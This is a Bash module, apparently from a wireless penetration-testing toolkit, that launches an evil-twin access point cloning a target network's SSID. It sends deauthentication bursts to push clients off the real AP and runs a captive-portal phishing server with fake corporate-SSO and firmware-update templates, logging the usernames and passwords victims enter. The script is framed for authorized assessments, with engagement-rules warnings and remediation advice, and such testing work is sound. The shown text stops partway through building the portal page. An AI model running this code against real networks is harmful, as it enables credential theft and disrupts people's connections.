#!/usr/bin/env bash
# MODULE_META
# NAME="Rogue AP / Evil Twin"
# CATEGORY="F"
# DEPS="A1"
# CRITICAL="yes"
# TOOLS="hostapd,dnsmasq,python3,iptables"
# DESC="Deploy evil twin AP to test client susceptibility and WIDS response"
# REQS="dual_iface,target_ssid,target_channel"
# PCAP="yes"
# DECODE="dhcp"

#===============================================================================
#  modules/f1_rogue_ap.sh
#  F1: Rogue AP / Evil Twin (Multi-Mode)
#
#  PURPOSE:
#    Test client susceptibility to evil twin attacks using multiple
#    attack modes selected via an interactive sub-menu:
#      Mode A: Passive Monitor — open rogue AP, observe probes/connections
#      Mode B: Deauth + Reconnect — force clients off real AP onto rogue
#      Mode C: Captive Portal Phishing — serve fake login page to harvest creds
#
#  TOOLS: ${TOOL_PATHS[hostapd]}, ${TOOL_PATHS[dnsmasq]}, ${TOOL_PATHS[tcpdump]}, ${TOOL_PATHS[aireplay-ng]}, python3
#  PHASE: 2A — Attack Simulations
#  DEPENDENCIES: A1 (needs target SSID)
#
#  EVIDENCE PRODUCED:
#    - f1_rogue_ap.conf            (${TOOL_PATHS[hostapd]} configuration used)
#    - f1_client_probes.pcap       (captured probe/assoc requests)
#    - f1_portal_creds.txt         (harvested credentials, Mode C)
#    - f1_findings.txt             (analysis summary)
#
#  RESULT JSON FIELDS:
#    - attack_mode: string (passive|deauth|portal)
#    - rogue_ap_started: bool
#    - clients_connected: int
#    - wids_detected: bool
#    - probe_requests_seen: int
#    - credentials_captured: int (Mode C only)
#===============================================================================

run_f1() {
    local evidence_prefix="${SESSION_EVIDENCE_DIR}/f1"

    #--- Step 1: Verify tools and select interface ---
    log_step 1 10 "Verifying tools and requirements"
    update_tc_progress 1 10 "Checking"

    
    local has_hostapd=false
    local has_dnsmasq=false
    local has_aireplay=false
    local has_python3=false
    local has_iptables=false

    command -v hostapd &>/dev/null && has_hostapd=true
    command -v dnsmasq &>/dev/null && has_dnsmasq=true
    command -v aireplay-ng &>/dev/null && has_aireplay=true
    command -v python3 &>/dev/null && has_python3=true
    command -v iptables &>/dev/null && has_iptables=true

    if [[ "$has_hostapd" == "false" ]]; then
        log_error "${TOOL_PATHS[hostapd]} is required for rogue AP test."
        log_error "Install: apt install -y ${TOOL_PATHS[hostapd]}"
        return 1
    fi

    if [[ -z "${GUEST_SSID:-}" ]]; then
        log_error "Target SSID not set. Run A1 first."
        return 1
    fi

    # Detect available wireless interfaces for AP mode
    local primary_iface="${WIFI_INTERFACE:-wlan0}"
    local ap_iface=""

    local all_ifaces
    all_ifaces=$(iw dev 2>/dev/null | awk '/Interface/{print $2}' | grep -v "^${primary_iface}$" | grep -v "mon")

    if [[ -n "$all_ifaces" ]]; then
        ap_iface=$(echo "$all_ifaces" | head -1)
        log_success "Using secondary interface for AP: ${ap_iface}"
    else
        log_warn "No secondary wireless interface detected."
        echo ""
        echo -e "${C_YELLOW}  A second wireless adapter is recommended for evil twin testing.${C_RESET}"
        echo -e "${C_YELLOW}  Using the primary interface will disconnect from the target.${C_RESET}"
        echo ""
        get_or_request_param "use_primary" "  Use primary interface (${primary_iface})? [y/N]"
        if [[ "${use_primary,,}" == "y" ]]; then
            ap_iface="$primary_iface"
        else
            log_info "Aborted — no suitable interface."
            return 1
        fi
    fi

    #--- Step 2: ATTACK MODE SUB-MENU ---
    log_step 2 10 "Selecting attack mode and configuration"
    update_tc_progress 2 10 "Mode selection"

    local attack_mode=""
    export ROGUE_SSID="${GUEST_SSID}"

    while true; do
        echo ""
        echo -e "${C_CYAN}${C_BOLD}  ┌── F1: ROGUE AP CONFIGURATION ──────────────────────────────────┐${C_RESET}"
        echo -e "  ${C_CYAN}│${C_RESET}"
        echo -e "  ${C_CYAN}│${C_RESET}  Target SSID: ${C_BOLD}${GUEST_SSID}${C_RESET}"
        echo -e "  ${C_CYAN}│${C_RESET}  Rogue SSID:  ${C_BOLD}${ROGUE_SSID}${C_RESET}"
        echo -e "  ${C_CYAN}│${C_RESET}  Interface:   ${C_BOLD}${ap_iface}${C_RESET}"
        echo -e "  ${C_CYAN}│${C_RESET}"
        echo -e "  ${C_CYAN}├──────────────────────────────────────────────────────────────────┤${C_RESET}"
        echo -e "  ${C_CYAN}│${C_RESET}  ${C_BOLD}Select Attack Mode:${C_RESET}"
        echo -e "  ${C_CYAN}│${C_RESET}    ${C_GREEN}[A]${C_RESET} Passive Monitor (Silent Evil Twin)"
        echo -e "  ${C_CYAN}│${C_RESET}    ${C_YELLOW}[B]${C_RESET} Deauth + Evil Twin (Active Migration)"
        echo -e "  ${C_CYAN}│${C_RESET}    ${C_RED}[C]${C_RESET} Captive Portal Phishing (Credential Harvest)"
        echo -e "  ${C_CYAN}│${C_RESET}"
        echo -e "  ${C_CYAN}│${C_RESET}  ${C_BOLD}Customization:${C_RESET}"
        echo -e "  ${C_CYAN}│${C_RESET}    ${C_CYAN}[T]${C_RESET} Select Target from Scan Results (A1)"
        echo -e "  ${C_CYAN}│${C_RESET}    ${C_CYAN}[S]${C_RESET} Change Rogue SSID (currently: ${ROGUE_SSID})"
        echo -e "  ${C_CYAN}│${C_RESET}"
        echo -e "  ${C_CYAN}│${C_RESET}    ${C_GRAY}[Q]${C_RESET} Cancel"
        echo -e "${C_CYAN}  └──────────────────────────────────────────────────────────────────┘${C_RESET}"

        get_or_request_param "mode_choice" "  Selection"
        case "${mode_choice,,}" in
            a) attack_mode="passive" ; break ;;
            b) if [[ "$has_aireplay" == "false" ]]; then
                   echo -e "  ${C_RED}${TOOL_PATHS[aireplay-ng]} required for deauth mode.${C_RESET}" ; continue
               fi
               attack_mode="deauth" ; break ;;
            c) if [[ "$has_python3" == "false" || "$has_dnsmasq" == "false" ]]; then
                   echo -e "  ${C_RED}python3 and ${TOOL_PATHS[dnsmasq]} required for portal mode.${C_RESET}" ; continue
               fi
               attack_mode="portal"
               _f1_portal_submenu || continue
               break ;;
            t) if select_target_network; then
                   local ROGUE_SSID="${GUEST_SSID}"
                   echo -e "  ${C_GREEN}Target updated to: ${GUEST_SSID} (${GUEST_BSSID})${C_RESET}"
               fi
               continue ;;
            s) echo ""
               get_or_request_param "custom_ssid" "  Enter custom SSID for Rogue AP [default: ${GUEST_SSID}]"
               ROGUE_SSID="${custom_ssid:-$GUEST_SSID}"
               continue ;;
            q) return 1 ;;
            *) echo -e "  ${C_RED}Invalid selection.${C_RESET}" ;;
        esac
    done

    log_success "Attack mode: ${attack_mode^^}, SSID: ${ROGUE_SSID}"

    # Mode C sub-options (set by _f1_portal_submenu)
    # PORTAL_DEAUTH, PORTAL_TEMPLATE are set as globals

    #--- Confirmation ---
    echo ""
    echo -e "${C_BG_RED}${C_WHITE}${C_BOLD}"
    echo "  ╔════════════════════════════════════════════════════════════════════╗"
    echo "  ║  ★ LAUNCHING EVIL TWIN — MODE: ${attack_mode^^}"
    echo "  ║                                                                    ║"
    case "$attack_mode" in
        passive)
            echo "  ║  • Open rogue AP will broadcast: ${GUEST_SSID}"
            echo "  ║  • Passive monitoring — no client disruption                     ║" ;;
        deauth)
            echo "  ║  • Deauth frames will be sent to real AP                         ║"
            echo "  ║  • Rogue AP will capture reconnecting clients                    ║"
            echo "  ║  • WILL disrupt existing connections                              ║" ;;
        portal)
            echo "  ║  • Captive portal phishing page will be served                   ║"
            echo "  ║  • Credentials entered will be captured                           ║"
            echo "  ║  • ⚠  HANDLE CAPTURED CREDENTIALS PER ENGAGEMENT RULES          ║" ;;
    esac
    echo "  ╚════════════════════════════════════════════════════════════════════╝"
    echo -e "${C_RESET}"
    echo ""
    get_or_request_param "confirm" "  Final confirmation — proceed? [Y/n]"
    [[ "${confirm,,}" == "n" ]] && return 1

    # --- Initialize tracking variables ---
    local rogue_ap_started="false"
    local clients_connected=0
    local wids_detected="false"
    local probe_requests_seen=0
    local credentials_captured=0
    local findings_file="${evidence_prefix}_findings.txt"

    {
        echo "============================================================"
        echo "  F1: Rogue AP / Evil Twin Test"
        echo "  Date: $(date '+%Y-%m-%d %H:%M:%S')"
        echo "  Target SSID: ${GUEST_SSID}"
        echo "  AP Interface: ${ap_iface}"
        echo "  Attack Mode: ${attack_mode}"
        echo "============================================================"
        echo ""
    } > "$findings_file"

    #--- Step 3: Prepare interface ---
    log_step 3 10 "Preparing wireless interface"
    update_tc_progress 3 10 "Preparing"

    check_abort || return 1

    run_tool ip link set "$ap_iface" down 2>/dev/null || true
    iw dev "$ap_iface" set type __ap 2>/dev/null || true
    run_tool ip link set "$ap_iface" up 2>/dev/null || true
    register_cleanup "run_tool ip addr flush dev $ap_iface 2>/dev/null || true; run_tool ip link set $ap_iface down 2>/dev/null || true; iw dev $ap_iface set type managed 2>/dev/null || true; run_tool ip link set $ap_iface up 2>/dev/null || true"

    local rogue_subnet="10.99.99"
    run_tool ip addr flush dev "$ap_iface" 2>/dev/null || true
    run_tool ip addr add "${rogue_subnet}.1/24" dev "$ap_iface" 2>/dev/null || true

    #--- Step 4: Create ${TOOL_PATHS[hostapd]} config ---
    log_step 4 10 "Configuring rogue AP"
    update_tc_progress 4 10 "Configuring"

    check_abort || return 1

    local hostapd_conf="${evidence_prefix}_rogue_ap.conf"
    local rogue_channel=6
    if [[ "${GUEST_CHANNEL:-6}" == "6" ]]; then
        local rogue_channel=1
    fi

    cat > "$hostapd_conf" <<EOF
interface=${ap_iface}
driver=nl80211
ssid=${ROGUE_SSID}
hw_mode=g
channel=${rogue_channel}
auth_algs=1
wpa=0
EOF

    log_success "Rogue AP config: SSID=${ROGUE_SSID}, CH=${rogue_channel}"

    #--- Step 5: Start rogue AP infrastructure ---
    log_step 5 10 "Starting rogue AP services"
    update_tc_progress 5 10 "Starting AP"

    check_abort || return 1

    # --- Start ${TOOL_PATHS[tcpdump]} for probes/associations ---
    local probe_pcap="${evidence_prefix}_client_probes.pcap"
    ${TOOL_PATHS[tcpdump]} -i "$ap_iface" -w "$probe_pcap" \
        'type mgt subtype probe-req or type mgt subtype assoc-req or type mgt subtype auth' \
        &>/dev/null &
    local tcpdump_pid=$!
    register_cleanup "kill -SIGINT $tcpdump_pid 2>/dev/null || true; wait $tcpdump_pid 2>/dev/null || true"

    # --- Start ${TOOL_PATHS[dnsmasq]} (DHCP + DNS) ---
    local dnsmasq_pid=""
    if [[ "$has_dnsmasq" == "true" ]]; then
        local dnsmasq_conf="$TMP_DIR/f1_dnsmasq.conf"

        if [[ "$attack_mode" == "portal" ]]; then
            # Portal mode: redirect ALL DNS to our IP
            cat > "$dnsmasq_conf" <<EOF
interface=${ap_iface}
dhcp-range=${rogue_subnet}.100,${rogue_subnet}.200,255.255.255.0,5m
dhcp-option=3,${rogue_subnet}.1
dhcp-option=6,${rogue_subnet}.1
log-queries
log-dhcp
no-resolv
address=/#/${rogue_subnet}.1
EOF
        else
            # Normal mode: forward DNS
            cat > "$dnsmasq_conf" <<EOF
interface=${ap_iface}
dhcp-range=${rogue_subnet}.100,${rogue_subnet}.200,255.255.255.0,12h
dhcp-option=3,${rogue_subnet}.1
dhcp-option=6,${rogue_subnet}.1
log-queries
log-dhcp
no-resolv
server=8.8.8.8
EOF
        fi

        ${TOOL_PATHS[dnsmasq]} -C "$dnsmasq_conf" -d &>/dev/null &
        local dnsmasq_pid=$!
        register_cleanup "kill -TERM $dnsmasq_pid 2>/dev/null || true; wait $dnsmasq_pid 2>/dev/null || true"
    fi

    # --- Start ${TOOL_PATHS[hostapd]} ---
    log_cmd "${TOOL_PATHS[hostapd]} ${hostapd_conf}"
    ${TOOL_PATHS[hostapd]} "$hostapd_conf" > $TMP_DIR/f1_hostapd.log 2>&1 &
    local hostapd_pid=$!
    register_cleanup "kill -TERM $hostapd_pid 2>/dev/null || true; wait $hostapd_pid 2>/dev/null || true"

    sleep 3

    if kill -0 $hostapd_pid 2>/dev/null; then
        local rogue_ap_started="true"
        log_success "Rogue AP broadcasting: ${GUEST_SSID} on CH ${rogue_channel}"
        echo "Rogue AP started successfully" >> "$findings_file"
    else
        log_error "Failed to start rogue AP"
        cat $TMP_DIR/f1_hostapd.log >> "$findings_file" 2>/dev/null
        _f1_cleanup "$ap_iface" "$tcpdump_pid" "$dnsmasq_pid" "" ""
        return 1
    fi

    #--- Step 6: Captive portal (Mode C only) ---
    local portal_pid=""
    local portal_creds_file="${evidence_prefix}_portal_creds.txt"

    if [[ "$attack_mode" == "portal" ]]; then
        log_step 6 10 "Starting captive portal phishing server"
        update_tc_progress 6 10 "Portal active"

        check_abort || return 1

        # Set up iptables to redirect HTTP traffic to our portal
        if [[ "$has_iptables" == "true" ]]; then
            # Enable IP forwarding
            local orig_forwarding=$(cat /proc/sys/net/ipv4/ip_forward)
            echo 1 > /proc/sys/net/ipv4/ip_forward 2>/dev/null || true
            register_cleanup "echo ${orig_forwarding} > /proc/sys/net/ipv4/ip_forward 2>/dev/null || true"

            # Redirect HTTP (port 80) to our portal server (port 8080)
            iptables -t nat -A PREROUTING -i "$ap_iface" -p tcp --dport 80 -j DNAT --to-destination "${rogue_subnet}.1:8080" 2>/dev/null || true
            register_cleanup "iptables -t nat -D PREROUTING -i $ap_iface -p tcp --dport 80 -j DNAT --to-destination ${rogue_subnet}.1:8080 2>/dev/null || true"

            iptables -t nat -A PREROUTING -i "$ap_iface" -p tcp --dport 443 -j DNAT --to-destination "${rogue_subnet}.1:8080" 2>/dev/null || true
            register_cleanup "iptables -t nat -D PREROUTING -i $ap_iface -p tcp --dport 443 -j DNAT --to-destination ${rogue_subnet}.1:8080 2>/dev/null || true"

            iptables -A FORWARD -i "$ap_iface" -j ACCEPT 2>/dev/null || true
            register_cleanup "iptables -D FORWARD -i $ap_iface -j ACCEPT 2>/dev/null || true"
        fi

        # Create phishing portal page
        _f1_create_portal_page "$GUEST_SSID" "${PORTAL_TEMPLATE:-generic}"

        # Start Python HTTP server for captive portal
        {
            echo "# Captured Credentials"
            echo "# Date: $(date '+%Y-%m-%d %H:%M:%S')"
            echo "# ⚠ HANDLE PER ENGAGEMENT RULES"
            echo ""
        } > "$portal_creds_file"

        python3 $TMP_DIR/f1_portal_server.py \
            --port 8080 \
            --creds-file "$portal_creds_file" \
            &>$TMP_DIR/f1_portal.log &
        local portal_pid=$!
        register_cleanup "kill -TERM $portal_pid 2>/dev/null || true; wait $portal_pid 2>/dev/null || true"

        sleep 2
        if kill -0 $portal_pid 2>/dev/null; then
            log_success "Captive portal active on ${rogue_subnet}.1:8080"
        else
            log_warn "Portal server failed to start — continuing without portal"
            cat $TMP_DIR/f1_portal.log >> "$findings_file" 2>/dev/null
            local portal_pid=""
        fi
    else
        log_step 6 10 "Skipping portal (Mode: ${attack_mode})"
        update_tc_progress 6 10 "N/A"
    fi

    #--- Step 7: Deauth (Mode B and optionally Mode C) ---
    if [[ "$attack_mode" == "deauth" || ("$attack_mode" == "portal" && "${PORTAL_DEAUTH:-no}" == "yes") ]]; then
        log_step 7 10 "Sending deauthentication frames to target AP"
        update_tc_progress 7 10 "Deauth"

        check_abort || { _f1_cleanup "$ap_iface" "$tcpdump_pid" "$dnsmasq_pid" "$hostapd_pid" "$portal_pid"; return 1; }

        if [[ "$has_aireplay" == "true" && -n "${GUEST_BSSID:-}" ]]; then
            # Need monitor mode on primary for deauth while rogue AP runs on secondary
            local mon_iface=""
            if [[ "$ap_iface" != "$primary_iface" ]]; then
                # We can use primary for monitor mode while secondary runs AP
                ${TOOL_PATHS[airmon-ng]} start "$primary_iface" 2>/dev/null || true
                local mon_iface="${primary_iface}mon"
                [[ ! -d "/sys/class/net/${mon_iface}" ]] && mon_iface="${primary_iface}"
                iw dev "$mon_iface" set channel "${GUEST_CHANNEL:-$rogue_channel}" 2>/dev/null || true
            fi

            if [[ -n "$mon_iface" ]]; then
                log_info "Sending deauth to force clients to rogue AP..."
                for burst in 1 2 3; do
                    ${TOOL_PATHS[aireplay-ng]} --deauth 10 -a "$GUEST_BSSID" "$mon_iface" &>/dev/null || true
                    sleep 5
                done
                echo "Sent 3 bursts of deauth frames" >> "$findings_file"

                # Restore primary
                ${TOOL_PATHS[airmon-ng]} stop "$mon_iface" 2>/dev/null || true
            else
                log_warn "Cannot deauth — same interface used for AP and deauth"
            fi
        fi
    else
        log_step 7 10 "Skipping deauth (Mode: ${attack_mode})"
        update_tc_progress 7 10 "N/A"
    fi

    #--- Step 8: Monitor for connections ---
    local monitor_time=90
    [[ "$attack_mode" == "portal" ]] && monitor_time=180  # Longer for portal

    log_step 8 10 "Monitoring for connections (${monitor_time}s)"
    update_tc_progress 8 10 "Monitoring"

    check_abort || { _f1_cleanup "$ap_iface" "$tcpdump_pid" "$dnsmasq_pid" "$hostapd_pid" "$portal_pid"; return 1; }

    local elapsed=0
    local check_interval=15

    start_countdown $monitor_time "Evil twin active (${attack_mode}) — monitoring"

    while [[ $elapsed -lt $monitor_time ]]; do
        sleep $check_interval
        local elapsed=$((elapsed + check_interval))

        # Live status updates
        local current_clients=0
        if [[ -f $TMP_DIR/f1_hostapd.log ]]; then
            local current_clients=$(grep -c "AP-STA-CONNECTED" $TMP_DIR/f1_hostapd.log 2>/dev/null) || true
        fi

        local current_creds=0
        if [[ "$attack_mode" == "portal" && -f "$portal_creds_file" ]]; then
            local current_creds=$(grep -c "^CRED:" "$portal_creds_file" 2>/dev/null) || true
        fi

        # Show periodic status
        if [[ $((elapsed % 30)) -eq 0 ]]; then
            local status_line="  [${elapsed}/${monitor_time}s] Clients: ${current_clients}"
            [[ "$attack_mode" == "portal" ]] && status_line+=", Creds captured: ${current_creds}"
            echo -e "${C_DIM}${status_line}${C_RESET}"
        fi

        check_abort && break
    done

    stop_countdown

    # Final counts
    if [[ -f $TMP_DIR/f1_hostapd.log ]]; then
        local clients_connected=$(grep -c "AP-STA-CONNECTED" $TMP_DIR/f1_hostapd.log 2>/dev/null) || true
        local clients_connected=${clients_connected:-0}

        if [[ $clients_connected -gt 0 ]]; then
            log_result "CRITICAL" "★ ${clients_connected} client(s) connected to rogue AP!"
            echo "CRITICAL: ${clients_connected} client(s) connected" >> "$findings_file"
            grep "AP-STA-CONNECTED" $TMP_DIR/f1_hostapd.log >> "$findings_file" 2>/dev/null
        fi
    fi

    # Count portal credentials
    if [[ "$attack_mode" == "portal" && -f "$portal_creds_file" ]]; then
        local credentials_captured=$(grep -c "^CRED:" "$portal_creds_file" 2>/dev/null) || true
        local credentials_captured=${credentials_captured:-0}

        if [[ $credentials_captured -gt 0 ]]; then
            log_result "CRITICAL" "★ ${credentials_captured} credential set(s) captured via phishing portal!"
            echo "CRITICAL: ${credentials_captured} credential(s) harvested via captive portal" >> "$findings_file"
        fi
    fi

    # Check WIDS
    if ! kill -0 $hostapd_pid 2>/dev/null; then
        local wids_detected="true"
        log_info "Rogue AP terminated — possible WIDS response"
        echo "NOTE: ${TOOL_PATHS[hostapd]} terminated — possible WIDS" >> "$findings_file"
    fi

    #--- Step 9: Cleanup ---
    log_step 9 10 "Cleaning up"
    update_tc_progress 9 10 "Cleanup"

    _f1_cleanup "$ap_iface" "$tcpdump_pid" "$dnsmasq_pid" "$hostapd_pid" "$portal_pid"

    # Iptables cleanup is handled by register_cleanup
    
    # Rest of cleanup

    # Count probe requests
    if [[ -f "$probe_pcap" ]]; then
        validate_pcap "$probe_pcap" "Rogue AP client probe/association capture"
        if command -v tshark &>/dev/null; then
            ensure_user_ownership "$probe_pcap"
            local probe_requests_seen=$(run_as_user tshark -r "$probe_pcap" -Y "wlan.fc.type_subtype == 0x04" 2>/dev/null | wc -l) || true
            local probe_requests_seen=${probe_requests_seen:-0}
        fi
    fi

    # Cleanup temp files
    rm -f $TMP_DIR/f1_dnsmasq.conf $TMP_DIR/f1_hostapd.log $TMP_DIR/f1_portal_server.py \
          $TMP_DIR/f1_portal.html $TMP_DIR/f1_portal_success.html $TMP_DIR/f1_portal.log

    #--- Step 10: Save results ---
    log_step 10 10 "Saving results"
    update_tc_progress 10 10 "Saving"

    local result_status="SECURE"
    local result_summary=""
    local recommendations=""

    if [[ $credentials_captured -gt 0 ]]; then
        local result_status="FINDING"
        local result_summary="CRITICAL: ${credentials_captured} credential set(s) captured via evil twin captive portal phishing. "
        result_summary+="${clients_connected} client(s) connected to rogue AP with SSID '${GUEST_SSID}'."
        local recommendations="1) Deploy WPA3-SAE or WPA2-Enterprise with certificate pinning. "
        recommendations+="2) Educate users to recognize fake captive portals and never enter credentials on unexpected login pages. "
        recommendations+="3) Deploy WIDS/WIPS to detect and auto-contain rogue APs. "
        recommendations+="4) Disable auto-connect policies on managed devices. "
        recommendations+="5) Use certificate-based (passwordless) authentication."
    elif [[ $clients_connected -gt 0 ]]; then
        local result_status="FINDING"
        local result_summary="CRITICAL: ${clients_connected} client(s) auto-connected to rogue AP (mode: ${attack_mode}). Evil twin attacks are viable."
        local recommendations="1) Deploy WPA3-SAE or WPA2-Enterprise with certificate validation. "
        recommendations+="2) Deploy WIDS/WIPS to detect rogue APs. "
        recommendations+="3) Disable auto-connect on managed devices. "
        recommendations+="4) Use 802.11w (MFP) to prevent deauth-based evil twin attacks."
    elif [[ "$rogue_ap_started" == "true" ]]; then
        if [[ "$wids_detected" == "true" ]]; then
            local result_summary="Rogue AP deployed but WIDS/WIPS detected and responded. No clients connected."
            local recommendations="WIDS is working. Consider testing certificate validation with enterprise rogue AP."
        else
            local result_summary="Rogue AP deployed (mode: ${attack_mode}) but no clients connected during test."
            local recommendations="Consider re-testing during peak hours. Deploy WIDS/WIPS if not in place."
        fi
    else
        local result_summary="Rogue AP could not be started."
        local recommendations="Ensure wireless adapter supports AP mode."
    fi

    local evidence_list="[\"f1_rogue_ap.conf\", \"f1_client_probes.pcap\", \"f1_findings.txt\""
    [[ "$attack_mode" == "portal" ]] && evidence_list+=", \"f1_portal_creds.txt\""
    evidence_list+="]"

    local result_json
    local result_json=$(run_tool jq -n \
        --arg status "$result_status" \
        --arg summary "$result_summary" \
        --arg details "Mode: ${attack_mode}, AP: ${rogue_ap_started}, Clients: ${clients_connected}, WIDS: ${wids_detected}, Probes: ${probe_requests_seen}, Creds: ${credentials_captured}" \
        --arg recommendations "$recommendations" \
        --arg attack_mode "$attack_mode" \
        --arg rogue_ap_started "$rogue_ap_started" \
        --argjson clients_connected "$clients_connected" \
        --arg wids_detected "$wids_detected" \
        --argjson probe_requests_seen "${probe_requests_seen:-0}" \
        --argjson credentials_captured "${credentials_captured:-0}" \
        --argjson evidence_files "$evidence_list" \
        '{
            status: $status,
            summary: $summary,
            details: $details,
            recommendations: $recommendations,
            attack_mode: $attack_mode,
            rogue_ap_started: ($rogue_ap_started == "true"),
            clients_connected: $clients_connected,
            wids_detected: ($wids_detected == "true"),
            probe_requests_seen: $probe_requests_seen,
            credentials_captured: $credentials_captured,
            evidence_files: $evidence_files
        }')

    save_tc_result "F1" "$result_json" "has_tool_output:1,clean_run:1"

    # Display summary
    echo ""
    if [[ $credentials_captured -gt 0 ]]; then
        log_result "CRITICAL" "★ ${credentials_captured} credential(s) phished via evil twin portal"
    elif [[ $clients_connected -gt 0 ]]; then
        log_result "CRITICAL" "★ ${clients_connected} client(s) connected to evil twin (${attack_mode})"
    elif [[ "$wids_detected" == "true" ]]; then
        log_result "SECURE" "WIDS detected rogue AP — no clients connected"
    elif [[ "$rogue_ap_started" == "true" ]]; then
        log_result "INFO" "Rogue AP deployed (${attack_mode}) — no clients in test window"
    else
        log_result "INFO" "Rogue AP could not be started"
    fi

    return 0
}

#===============================================================================
#  HELPER FUNCTIONS
#===============================================================================

#--- Portal template sub-menu ---
_f1_portal_submenu() {
    export PORTAL_DEAUTH="no"
    export PORTAL_TEMPLATE="generic"
    export PORTAL_CUSTOM_PATH=""

    echo ""
    echo -e "  ${C_MAGENTA}${C_BOLD}┌── CAPTIVE PORTAL OPTIONS ──────────────────────────────────────┐${C_RESET}"
    echo ""
    echo -e "  ${C_BOLD}  Portal Template:${C_RESET}"
    echo -e "    ${C_GREEN}[1]${C_RESET} Generic WiFi Login — \"Connect to WiFi\" with email/password"
    echo -e "    ${C_GREEN}[2]${C_RESET} Corporate SSO — Fake corporate single sign-on page"
    echo -e "    ${C_GREEN}[3]${C_RESET} Hotel/Airport — \"Accept Terms\" with optional login"
    echo -e "    ${C_GREEN}[4]${C_RESET} Update Required — \"Firmware update needed\" with password"
    echo -e "    ${C_CYAN}[5]${C_RESET} Custom Template — Provide your own HTML file"
    echo ""

    get_or_request_param "tmpl_choice" "    Template [1-5, default=1]"
    case "$tmpl_choice" in
        2) PORTAL_TEMPLATE="corporate" ;;
        3) PORTAL_TEMPLATE="hotel" ;;
        4) PORTAL_TEMPLATE="update" ;;
        5) PORTAL_TEMPLATE="custom"
           _f1_custom_template_prompt || return 1
           ;;
        *) PORTAL_TEMPLATE="generic" ;;
    esac

    echo ""
    echo -e "  ${C_BOLD}  Deauth Enhancement:${C_RESET}"
    echo -e "    Send deauth frames to force clients onto the rogue AP?"
    echo -e "    ${C_DIM}(Requires ${TOOL_PATHS[aireplay-ng]} and second interface)${C_RESET}"
    echo ""
    get_or_request_param "deauth_choice" "    Enable deauth? [y/N]"
    [[ "${deauth_choice,,}" == "y" ]] && PORTAL_DEAUTH="yes"

    echo ""
    local tmpl_display="${PORTAL_TEMPLATE^^}"
    [[ "$PORTAL_TEMPLATE" == "custom" ]] && tmpl_display="CUSTOM ($(basename "$PORTAL_CUSTOM_PATH"))"
    echo -e "  ${C_MAGENTA}${C_BOLD}└── Template: ${tmpl_display} | Deauth: ${PORTAL_DEAUTH^^} ─────────────────┘${C_RESET}"
    echo ""
    return 0
}

#--- Custom template prompt with validation ---
_f1_custom_template_prompt() {
    echo ""
    echo -e "  ${C_CYAN}${C_BOLD}┌── CUSTOM TEMPLATE REQUIREMENTS ──────────────────────────────────┐${C_RESET}"
    echo -e "  ${C_CYAN}│${C_RESET}"
    echo -e "  ${C_CYAN}│${C_RESET}  Your custom portal template must meet the following requirements:"
    echo -e "  ${C_CYAN}│${C_RESET}"
    echo -e "  ${C_CYAN}│${C_RESET}  ${C_BOLD}1. Single HTML file${C_RESET}  — One self-contained .html file"
    echo -e "  ${C_CYAN}│${C_RESET}     (CSS/JS must be inline, no external assets)"
    echo -e "  ${C_CYAN}│${C_RESET}"
    echo -e "  ${C_CYAN}│${C_RESET}  ${C_BOLD}2. Login form${C_RESET}        — Must contain a <form> that POSTs to /login"
    echo -e "  ${C_CYAN}│${C_RESET}     Example: ${C_DIM}<form method=\"POST\" action=\"/login\">${C_RESET}"
    echo -e "  ${C_CYAN}│${C_RESET}"
    echo -e "  ${C_CYAN}│${C_RESET}  ${C_BOLD}3. Input fields${C_RESET}     — Must have inputs named 'username' and/or 'password'"
    echo -e "  ${C_CYAN}│${C_RESET}     Example: ${C_DIM}<input type=\"text\" name=\"username\">${C_RESET}"
    echo -e "  ${C_CYAN}│${C_RESET}              ${C_DIM}<input type=\"password\" name=\"password\">${C_RESET}"
    echo -e "  ${C_CYAN}│${C_RESET}"
    echo -e "  ${C_CYAN}│${C_RESET}  ${C_BOLD}4. No external deps${C_RESET} — Images must be base64-encoded or inline SVG"
    echo -e "  ${C_CYAN}│${C_RESET}     (clients will have no real internet access)"
    echo -e "  ${C_CYAN}│${C_RESET}"
    echo -e "  ${C_CYAN}│${C_RESET}  ${C_DIM}After login, users are automatically redirected to a success page.${C_RESET}"
    echo -e "  ${C_CYAN}│${C_RESET}"
    echo -e "  ${C_CYAN}${C_BOLD}└──────────────────────────────────────────────────────────────────┘${C_RESET}"
    echo ""

    while true; do
        get_or_request_param "custom_path" "    Path to custom HTML template (or 'q' to go back)"

        [[ "${custom_path,,}" == "q" ]] && return 1

        # Expand ~ if used
        custom_path="${custom_path/#\~/$HOME}"

        # Validate file exists
        if [[ ! -f "$custom_path" ]]; then
            echo -e "    ${C_RED}✗ File not found: ${custom_path}${C_RESET}"
            continue
        fi

        # Validate it's an HTML file
        if [[ ! "$custom_path" =~ \.(html|htm)$ ]]; then
            echo -e "    ${C_RED}✗ File must be .html or .htm${C_RESET}"
            continue
        fi

        # Validate it contains a form with POST to /login
        local file_content
        file_content=$(cat "$custom_path")

        local validation_ok=true
        local warnings=""

        if ! echo "$file_content" | grep -qi 'action=.*/login'; then
            validation_ok=false
            echo -e "    ${C_RED}✗ Missing: <form> with action=\"/login\"> ${C_RESET}"
        fi

        if ! echo "$file_content" | grep -qi 'name=.*username'; then
            if ! echo "$file_content" | grep -qi 'name=.*password'; then
                validation_ok=false
                echo -e "    ${C_RED}✗ Missing: input fields named 'username' or 'password'${C_RESET}"
            else
                warnings+="  ⚠ No 'username' field (password-only mode)\n"
            fi
        fi

        if ! echo "$file_content" | grep -qi 'method=.*POST'; then
            warnings+="  ⚠ Form should use method=\"POST\" — credentials may not be captured\n"
        fi

        if [[ "$validation_ok" == "false" ]]; then
            echo -e "    ${C_YELLOW}Fix the errors above and try again.${C_RESET}"
            continue
        fi

        # Show warnings if any
        if [[ -n "$warnings" ]]; then
            echo -e "    ${C_YELLOW}${warnings}${C_RESET}"
        fi

        # Show preview info
        local file_size
        file_size=$(wc -c < "$custom_path")
        echo -e "    ${C_GREEN}✓ Template validated: $(basename "$custom_path") (${file_size} bytes)${C_RESET}"

        PORTAL_CUSTOM_PATH="$custom_path"
        return 0
    done
}

#--- Create the portal phishing page + Python HTTP server ---
_f1_create_portal_page() {
    local ssid="$1"
    local template="${2:-generic}"

    local portal_html="$TMP_DIR/f1_portal.html"
    local success_html="$TMP_DIR/f1_portal_success.html"

    # --- Success / thank-you page (always generated) ---
    cat > "$success_html" <<'SUCCESS_EOF'
<!DOCTYPE html>
<html><head>
<meta charset="utf-8"><title>Connected</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
*{margin:0;padding:0;box-sizing:border-box}
